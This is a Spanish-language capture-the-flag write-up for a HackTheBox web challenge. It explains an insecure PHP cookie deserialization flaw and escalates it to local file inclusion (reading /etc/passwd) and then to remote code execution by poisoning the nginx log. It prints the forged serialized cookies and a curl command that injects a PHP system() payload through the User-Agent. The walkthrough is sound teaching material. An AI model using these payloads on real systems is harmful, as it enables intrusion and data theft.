@@ -1,0 +1,293 @@
+I"[P<p>En este desafio primero tenemos una deserializacion insegura en la cookie PHPSESSID la cual nos permitira un LFI, despues mediante Log Poisoning conseguiremos un RCE en el User-Agent.</p>
+
+<p class="lead">Al ingresar a la web no podemos ver nada interesante a primera vista, tampoco al mostrar su codigo fuente, asi que nos decargaremos los archivos que nos proporciona HTB</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├── index.html
+├── index.php
+├── models
+│   └── PageModel.php
+</code></pre></div></div>
+
+<h2 id="insecure-deserialization">Insecure deserialization</h2>
+
+<p>Contenido de <code class="language-plaintext highlighter-rouge">index.php</code>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">spl_autoload_register</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/Model$/'</span><span class="p">,</span> <span class="nv">$name</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="nv">$name</span> <span class="o">=</span> <span class="s2">"models/${name}"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">include_once</span> <span class="s2">"${name}.php"</span><span class="p">;</span>
+<span class="p">});</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$page</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PageModel</span><span class="p">;</span>
+    <span class="nv">$page</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="s1">'/www/index.html'</span><span class="p">;</span>
+
+    <span class="nb">setcookie</span><span class="p">(</span>
+        <span class="s1">'PHPSESSID'</span><span class="p">,</span> 
+        <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$page</span><span class="p">)),</span> 
+        <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span> 
+        <span class="s1">'/'</span>
+    <span class="p">);</span>
+<span class="p">}</span> 
+
+<span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]);</span>
+<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
+</code></pre></div></div>
+<p>La primera parte del codigo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">spl_autoload_register</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/Model$/'</span><span class="p">,</span> <span class="nv">$name</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="nv">$name</span> <span class="o">=</span> <span class="s2">"models/${name}"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">include_once</span> <span class="s2">"${name}.php"</span><span class="p">;</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>Con la funcion <code class="language-plaintext highlighter-rouge">include_once</code> esta incluyendo un archivo con la extension .php de la carpeta Models en tiempo de ejecucion, es decir cuando se ejecute este script de PHP</p>
+
+<p>Despues, en esta parte:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$page</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PageModel</span><span class="p">;</span>
+    <span class="nv">$page</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="s1">'/www/index.html'</span><span class="p">;</span>
+
+    <span class="nb">setcookie</span><span class="p">(</span>
+        <span class="s1">'PHPSESSID'</span><span class="p">,</span> 
+        <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$page</span><span class="p">)),</span> 
+        <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span> 
+        <span class="s1">'/'</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Primero hace una validacion si la cookie <code class="language-plaintext highlighter-rouge">PHPSESSID</code> esta vacia</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>La cookie PHPSESSID permite a los sitios web almacenar datos serializados
+</code></pre></div></div>
+
+<p>En caso de que este vacia devuelve <code class="language-plaintext highlighter-rouge">true</code>, despues se crea una instancia de <code class="language-plaintext highlighter-rouge">PageModel</code> llamada <code class="language-plaintext highlighter-rouge">page</code> donde se configura el atributo <code class="language-plaintext highlighter-rouge">file</code> con el valor <code class="language-plaintext highlighter-rouge">/www/index.html</code> (la pagina que vemos al entrar al sitio):</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$page</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PageModel</span><span class="p">;</span>
+    <span class="nv">$page</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="s1">'/www/index.html'</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Despues se establece la cookie <code class="language-plaintext highlighter-rouge">PHPSESSID</code> con el valor serializado de <code class="language-plaintext highlighter-rouge">file</code>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">setcookie</span><span class="p">(</span>
+        <span class="s1">'PHPSESSID'</span><span class="p">,</span> 
+        <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$page</span><span class="p">)),</span> 
+        <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span> 
+        <span class="s1">'/'</span>
+    <span class="p">);</span>
+</code></pre></div></div>
+
+<p>La ultima parte del codigo es donde se encuentra la vulnerabilidad Insecure Deserialization:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]);</span>
+<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Basicamente en la ultima linea:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Se intenta deserializar y recuperar el valor de la cookie sin ningun tipo de sanitizacion, debido a esto nosotros podemos manipular el valor de la cookie para ingresar una cadena serializada maliciosa que haga lo que queramos.</p>
+
+<p>(si quieres saber mas sobre Insecure Deserialization puedes leer <a href="https://redfoxsec.com/blog/insecure-deserialization-in-php/">aqui</a>)</p>
+
+<h2 id="local-file-inclusion">Local FIle Inclusion</h2>
+
+<p>(si quieres saber como funciona LFI, puedes leer un post de mi compa <a href="https://droix3d.github.io/posts/LocalFileInclusion/">droix3d</a> que lo explica muy bien)</p>
+
+<p>Hace un momento dije que estaba incluyendo un archivo de la carpeta <code class="language-plaintext highlighter-rouge">Models</code>. En los archivo que nos descargamos de HTB esta ese archivo, pasaremos a verlo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">PageModel</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> 
+    <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Primeramente vemos la clase <code class="language-plaintext highlighter-rouge">PageModel</code> que se instancia en el otro archivo que explique, ademas tiene un atributo llamado <code class="language-plaintext highlighter-rouge">file</code>, y la parte vulnerable a LFI es lo de abajo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> 
+    <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>(si quieres saber como funcionan los contructores y destructores, puedes leer <a href="https://www.php.net/manual/es/language.oop5.decon.php">aqui</a>)</p>
+
+<p>La vulnerabilidad radica en como se esta incluyendo el archivo (this-&gt;file), esto es por que nosotros podemos manipular que archivo se puede incluir, ya que simplemente se esta incluyendo un archivo que se le pasa como valor al atributo de la clase sin ningun tipo de sanitizacion, veremos esto mas claro en la practica.</p>
+
+<p>Usare burp suite para interceptar la peticion y ver el objeto serializado:</p>
+
+<p><img src="/assets/img/toxic/1.png" alt="" /></p>
+
+<p>Vean como la cookie <code class="language-plaintext highlighter-rouge">PHPSESSID</code> tiene un valor que esta serializado, ateriormente vimos que esta usando base64, asi lo decodificaremos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
+</code></pre></div></div>
+
+<p>Vemos como el objeto deserializado lleva como nombre <code class="language-plaintext highlighter-rouge">PageModel</code> y el valor es lo que se la indica en el atributo <code class="language-plaintext highlighter-rouge">file</code>, y vemos que tiene <code class="language-plaintext highlighter-rouge">file";s:15:"/www/index.html</code>, asi que se esta incluyendo ese archivo</p>
+
+<p>Como mencione antes, en ninguno de los dos archivo se esta sanitizando ni madres, asi que nosotros podemos modificar el valor del atributo <code class="language-plaintext highlighter-rouge">file</code> de la cookie PHPSESSID, para corroborarlo, vamos a modificar el objeto deserializado y le indicaremos que incluya otro archivo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
+</code></pre></div></div>
+
+<p>Ahora estoy incluyendo el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, antes que nada, en donde dice <code class="language-plaintext highlighter-rouge">s:11</code> se refiere a la longitud de la cadena, osea la que esta despues entre comillas, esta longitud es la cantidad de caracteres, y le puse 11 por que <code class="language-plaintext highlighter-rouge">/etc/passwd</code> tiene 11 caracteres.</p>
+
+<p>Cuando le enviemos la peticion veremos el LFI:</p>
+
+<p><img src="/assets/img/toxic/2.png" alt="" /></p>
+
+<p>Y asi conseguimos LFI a travez de Insecure Deserialization</p>
+
+<h2 id="archivos-extra">Archivos extra</h2>
+
+<p>Antes que nada, exploraremos los demas archivos que nos descargamos, primero vemos un <code class="language-plaintext highlighter-rouge">Dockerfile</code> donde lo primero son unos acrhivos de configuracion de nginx:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Configure php-fpm and nginx
+COPY config/fpm.conf /etc/php7/php-fpm.d/www.conf
+COPY config/supervisord.conf /etc/supervisord.conf
+COPY config/nginx.conf /etc/nginx/nginx.conf
+</code></pre></div></div>
+<p>Con esto ya sabemos que usa nginx como servidor web</p>
+
+<p>Despues tenemos que copia la flag al directorio <code class="language-plaintext highlighter-rouge">flag</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>COPY flag /flag
+</code></pre></div></div>
+<p>Cabe recalcar que si intentamos leer la flag con el LFI que hicimos hace un rato no vamos a poder.</p>
+
+<p>Y como ultimo, tenemos que copia un archivo .sh:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Copy entrypoint
+COPY entrypoint.sh /entrypoint.sh
+</code></pre></div></div>
+<p>Este archivo si podemos ver su contenido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/ash</span>
+
+<span class="c"># Secure entrypoint</span>
+<span class="nb">chmod </span>600 /entrypoint.sh
+
+<span class="c"># Generate random flag filename</span>
+<span class="nb">mv</span> /flag /flag_<span class="sb">`</span><span class="nb">cat</span> /dev/urandom | <span class="nb">tr</span> <span class="nt">-dc</span> <span class="s1">'a-zA-Z0-9'</span> | <span class="nb">fold</span> <span class="nt">-w</span> 5 | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="sb">`</span>
+
+<span class="nb">exec</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span>
+</code></pre></div></div>
+<p>Como puden ver, se esta generando una flag con nombre random, asi que si o si debemos leerla con LFI</p>
+
+<h2 id="lfi-to-rce-via-log-poisoning">LFI to RCE via Log Poisoning</h2>
+
+<p>La idea de un log poisoning es manipular el contenido de los archivos de registro para inyectar codigo malicioso en los registro del servidor, en esta caso nginx, cabe recalcar que esto solo es posible si tenemos un LFI</p>
+
+<p>Como vimos en los archivo extra, hay archivos de configuracion de nginx, mostraremos el contenido de <code class="language-plaintext highlighter-rouge">nginx.conf</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user www;
+pid /run/nginx.pid;
+error_log /dev/stderr info;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    server_tokens off;
+    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
+    access_log /var/log/nginx/access.log docker;
+
+    charset utf-8;
+    keepalive_timeout 20s;
+    sendfile on;
+    tcp_nopush on;
+    client_max_body_size 1M;
+
+    include  /etc/nginx/mime.types;
+
+    server {
+        listen 80;
+        server_name _;
+
+        index index.php;
+        root /www;
+
+        location / {
+            try_files $uri $uri/ /index.php?$query_string;
+            location ~ \.php$ {
+                try_files $uri =404;
+                fastcgi_pass unix:/run/php-fpm.sock;
+                fastcgi_index index.php;
+                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+                include fastcgi_params;
+            }
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>Vemos como existe un archivo log en <code class="language-plaintext highlighter-rouge">/var/log/nginx/access.log</code> al cual le podemos hacer log poisoning para envenenar el registro de nginx, para esto debemos de crear otra cookie pero indicandole ese log:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'
+</code></pre></div></div>
+
+<p>La pasamos a base64 y nos queda:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=
+</code></pre></div></div>
+
+<p>Ahora nos vamos al burpsuite y relizamos la peticion con esa cookie:</p>
+
+<p><img src="/assets/img/toxic/3.png" alt="" /></p>
+
+<p>Basicamente podemos ver todas las peticiones que se han hecho, aca una:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>206.189.29.104 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0" 
+</code></pre></div></div>
+
+<p>Vemos que en cada peticion se registra la IP, el metodo, version de HTTP, el User-Agent y la URL,</p>
+
+<p>En un log poisoning, podemos consegir un RCE registrando nuestro codigo malicioso en el User-Agent, el metodo y la ruta, en este caso lo haremos a travez del User-Agent</p>
+
+<p>Esto es tan facil como al final del User-Agent le indicamos lo que queremos ejecutar:</p>
+
+<p><img src="/assets/img/toxic/4.png" alt="" /></p>
+
+<p>Y vemos como nuestro comando es ejecuto correctemante, y en los logs, al final del User-Agent se agrego un <code class="language-plaintext highlighter-rouge">bin</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>206.189.29.104 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0 bin
+</code></pre></div></div>
+
+<p>Y el resultado fue:</p>
+
+<p><img src="/assets/img/toxic/5.png" alt="" /></p>
+
+<p>Ahi mismo podemos ver la flag, y como ultimo debemos de hacerle un cat, en esta caso usare curl para que vean tambien como es:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url -i -v &lt;URL&gt; -A "&lt;?php system('cat /flag_uDwMK'); ?&gt;" -b "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo="
+</code></pre></div></div>
+
+<p>(el nombre de la flag es diferente por que tuve que hace otra instancia)</p>
+
+<p>Y listo, asi conseguimos la flag:</p>
+
+<p><img src="/assets/img/toxic/6.png" alt="" /></p>
+
+<p>Joder, esto si es RCE  🚬</p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
